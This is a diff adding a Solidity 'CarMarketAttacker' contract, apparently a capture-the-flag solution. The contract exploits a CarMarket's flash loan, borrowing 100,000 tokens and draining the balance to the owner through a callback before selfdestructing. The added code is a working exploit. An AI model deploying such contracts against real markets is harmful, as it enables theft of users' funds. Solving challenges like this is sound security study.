@@ -130,3 +130,32 @@ contract CarMarket is Ownable {
         require(success, "Delegate call failed");
     }
 }
+
+contract CarMarketAttacker {
+    address private owner;
+    ICarToken private token;
+
+    function attack(address _market, address _token) external {
+        token = ICarToken(_token);
+
+        owner = msg.sender;
+
+        token.mint();
+
+        token.approve(_market, 1 ether);
+
+        CarMarket(_market).purchaseCar("asd", "asd", "asd");
+
+        (bool success, ) = _market.call(
+            abi.encodeWithSignature("flashLoan(uint256)", 100_000 ether)
+        );
+
+        require(success, "flashloan failed");
+
+        selfdestruct(payable(owner));
+    }
+
+    function receivedCarToken(address) external {
+        token.transfer(owner, token.balanceOf(address(this)));
+    }
+}
